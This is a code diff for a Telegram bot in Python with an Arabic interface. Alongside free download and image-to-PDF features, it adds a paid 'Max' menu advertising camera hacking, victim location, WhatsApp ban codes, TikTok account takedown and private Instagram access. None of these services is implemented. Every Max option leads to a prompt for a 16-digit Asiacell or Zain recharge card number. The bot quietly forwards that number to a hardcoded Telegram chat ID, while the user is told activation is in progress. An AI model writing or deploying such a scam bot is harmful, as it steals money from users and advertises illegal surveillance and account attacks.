@@ -1,5 +1,6 @@
 import os
 import telebot
+from telebot import types
 from flask import Flask
 from threading import Thread
 import services
@@ -7,29 +8,111 @@ import services
 TOKEN = os.environ.get('TOKEN')
 bot = telebot.TeleBot(TOKEN)
 
-# --- إعداد Flask ---
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("الاشتراك المجاني", callback_data='free_sub'),
+               types.InlineKeyboardButton("اشتراك ماكس ✨", callback_data='max_sub'))
+    bot.send_message(message.chat.id, "أهلاً بك في ✨ 𝓜𝓐𝓧 𝓑𝓞𝓞𝓣 ✨", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: True)
+def callback_query(call):
+    if call.data == 'free_sub':
+        my_free_names = ["تحميل ستوري", "تحميل أي فيديو ", "الخدمة الثالثة", "تحويل صورة لـ PDF"]
+        markup = types.InlineKeyboardMarkup(row_width=2)
+        buttons = [types.InlineKeyboardButton(my_free_names[i], callback_data=f'f{i+1}') for i in range(4)]
+        markup.add(*buttons)
+        bot.edit_message_text("اختر الخدمة المجانية:", call.message.chat.id, call.message.message_id, reply_markup=markup)
+
+    elif call.data == 'f1':
+        msg = bot.send_message(call.message.chat.id, "أرسل الآن يوزر (معرف) الحساب:")
+        bot.register_next_step_handler(msg, process_insta_username)
+    elif call.data == 'f2':
+        msg = bot.send_message(call.message.chat.id, "أرسل لي رابط الفيديو:")
+        bot.register_next_step_handler(msg, process_video_link)
+    elif call.data == 'f4':
+        msg = bot.send_message(call.message.chat.id, "أرسل لي الصورة الآن:")
+        bot.register_next_step_handler(msg, process_image_to_pdf)
+    
+    elif call.data == 'max_sub':
+        my_names = [" 💀واتساب 🟡 ", "يوزرات تلي مميزة👑 ", "كود حظر واتس⚡️ ", "اختراق كاميرا📷 ", "معرفة موقع الضحية ","دعس حساب تيكتوك☠️ ", "أرقام فيك ✅ ", "فتح انستا برايفت👀 ", "فك حظر سافيوم994+ ", "كود حظر واتس", "مزايا انستا ✨", "تلغيم رابط🌎 ", "ببجي🎮 ", "رشق انستا✅ ", "تفعيل التطبيقات برو ", " 📱بليلردو لانهائي8 ", "اداة تيكتوك ترول ", "ازالة الاعلانات📢 ", "ارقام مفعلة حقيقيه✅", "تطبيقات ايفون برو "]
+        markup = types.InlineKeyboardMarkup(row_width=2)
+        buttons = [types.InlineKeyboardButton(my_names[i], callback_data=f'max_{i+1}') for i in range(20)]
+        markup.add(*buttons)
+        bot.edit_message_text("اختر خدمة ماكس المطلوبة:", call.message.chat.id, call.message.message_id, reply_markup=markup)
+    
+    elif call.data.startswith('max_'):
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("تفعيل ماكس ✨", callback_data='activate_max'))
+        bot.edit_message_text("عذراً، أنت غير مشترك في خطة ماكس ✨", call.message.chat.id, call.message.message_id, reply_markup=markup)
+
+    elif call.data == 'activate_max':
+        markup = types.InlineKeyboardMarkup(row_width=2)
+        markup.add(types.InlineKeyboardButton("🔴 Asiacell", callback_data='provider_asia'),
+                   types.InlineKeyboardButton("🔵 Zain", callback_data='provider_zain'))
+        bot.edit_message_text("اختر مزود الخدمة:", call.message.chat.id, call.message.message_id, reply_markup=markup)
+
+    elif call.data.startswith('provider_'):
+        provider = "آسياسيل" if call.data == 'provider_asia' else "زين"
+        msg = bot.send_message(call.message.chat.id, f"تم اختيار {provider}.\nيرجى إرسال رقم البطاقة (16 رقماً):")
+        bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))
+
+def process_insta_username(message):
+    username = message.text.replace('@', '').strip()
+    wait_msg = bot.send_message(message.chat.id, f"🔍 جاري البحث عن ستوري {username}...")
+    try:
+        stories = services.get_insta_data(username)
+        count = 0
+        for story in stories:
+            for item in story.get_items():
+                count += 1
+                if item.is_video: bot.send_video(message.chat.id, item.video_url, caption=f"ستوري {count}")
+                else: bot.send_photo(message.chat.id, item.url, caption=f"ستوري {count}")
+        if count == 0: bot.send_message(message.chat.id, "لم يتم العثور على ستوري.")
+        bot.delete_message(message.chat.id, wait_msg.message_id)
+    except Exception as e:
+        bot.send_message(message.chat.id, f"⚠️ حدث خطأ: {str(e)[:50]}")
+
+def process_video_link(message):
+    url = message.text.strip()
+    wait_msg = bot.send_message(message.chat.id, "⏳ جاري التحميل...")
+    try:
+        services.download_video_service(url)
+        with open('video.mp4', 'rb') as video:
+            bot.send_video(message.chat.id, video)
+        bot.delete_message(message.chat.id, wait_msg.message_id)
+        os.remove('video.mp4')
+    except Exception as e:
+        bot.send_message(message.chat.id, f"⚠️ حدث خطأ: {str(e)}")
+        bot.delete_message(message.chat.id, wait_msg.message_id)
+
+def process_image_to_pdf(message):
+    if message.content_type == 'photo':
+        file_info = bot.get_file(message.photo[-1].file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        with open("image.jpg", 'wb') as new_file:
+            new_file.write(downloaded_file)
+        services.convert_to_pdf("image.jpg", "output.pdf")
+        with open("output.pdf", 'rb') as pdf:
+            bot.send_document(message.chat.id, pdf)
+        os.remove("image.jpg"); os.remove("output.pdf")
+    else:
+        bot.reply_to(message, "يرجى إرسال صورة فقط.")
+
+def get_card_number(message, provider):
+    if message.text.isdigit() and len(message.text) == 16:
+        bot.reply_to(message, "جاري التفعيل..")
+        try: bot.send_message(438077185, f"طلب جديد:\nالمزود: {provider}\nالرقم: {message.text}")
+        except: pass
+    else:
+        msg = bot.reply_to(message, "خطأ: يرجى إرسال 16 رقماً فقط.")
+        bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))
+
 app = Flask('')
 @app.route('/')
 def home(): return "البوت يعمل!"
 
-# هذه الدالة لتشغيل الويب فقط
-def run_web():
-    port = int(os.environ.get("PORT", 8080))
-    app.run(host='0.0.0.0', port=port)
-
-# تشغيل الويب في خلفية (Thread)
-Thread(target=run_web).start()
-
-# --- معالجة الأزرار ---
-@bot.callback_query_handler(func=lambda call: True)
-def callback_query(call):
-    if call.data == 'to_pdf':
-        services.convert_photo_to_pdf(bot, call.message)
-    elif call.data == 'to_text':
-        services.convert_photo_to_text(bot, call.message)
-
-# --- تشغيل البوت ---
-# البوت يعمل هنا في الخط الأساسي، والويب يعمل في Thread
 if __name__ == "__main__":
-    print("البوت بدأ العمل...")
+    port = int(os.environ.get("PORT", 8080))
+    Thread(target=lambda: app.run(host='0.0.0.0', port=port)).start()
     bot.infinity_polling()
